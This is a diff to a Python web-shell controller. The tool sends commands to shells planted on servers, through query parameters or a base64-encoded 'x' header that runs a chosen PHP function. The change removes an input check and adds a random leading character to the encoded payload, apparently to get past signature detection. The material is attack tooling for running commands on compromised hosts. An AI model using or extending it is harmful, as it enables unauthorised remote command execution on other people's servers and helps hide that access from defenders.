@@ -31,8 +31,6 @@ if shell == '1':
 if shell == '2':
     shell = 'ninja'
     url = input('%s Enter the URL of shell: ' % que)
-else:
-    exit('%s You can\'t even enter a number correctly?' % bad)
 function = input('%s Enter the function to use: ' % que)
 if not url.startswith('http'):
     url = 'http://' + url
@@ -56,7 +54,8 @@ def requester(url, payload, shell):
         payload = '?f=%s&c=%s&p=%s' % (function, payload, passwd)
         print (requests.get(url + payload , headers=headers).text)
     elif shell == 'ninja':
-        payload = 'j' + (base64.b64encode((function + '(' + payload + ')').encode('utf-8'))).decode('utf-8')
+        bases = ['T', 'w', 'F', 'v', 'Z', 'n']
+        payload = random.choice(bases) + (base64.b64encode((function + '(' + payload + ')').encode('utf-8'))).decode('utf-8')
         headers['x'] = payload
         print (requests.get(url, headers=headers).text)
 while True:
